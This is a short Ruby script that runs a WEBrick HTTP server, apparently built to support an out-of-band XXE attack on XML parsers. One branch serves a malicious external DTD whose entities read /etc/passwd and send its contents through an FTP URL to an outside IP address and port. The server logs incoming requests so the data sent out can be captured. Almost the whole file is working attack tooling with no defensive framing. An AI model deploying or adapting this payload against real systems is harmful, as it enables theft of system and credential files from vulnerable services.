# Ref: https://gist.github.com/dtchepak/13b53eef9dc6b65ae1ad
require 'webrick'

HTTP = true

class Echo < WEBrick::HTTPServlet::AbstractServlet
  def do_GET(request, response)
    puts request
    response.status = 200

    if HTTP
      response.body = <<-EOF

      EOF
    else
      response.body = <<-EOF
      <!ENTITY % payload SYSTEM "file:///etc/passwd">
      <!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://uname:%payload;@10.132.56.222:13336/'>">
      %param1;
      EOF
    end
  end

  def do_POST(request, response)
    puts request
    response.status = 200
  end
end

server = WEBrick::HTTPServer.new(:Port => 13337)
server.mount "/", Echo
trap "INT" do server.shutdown end
server.start
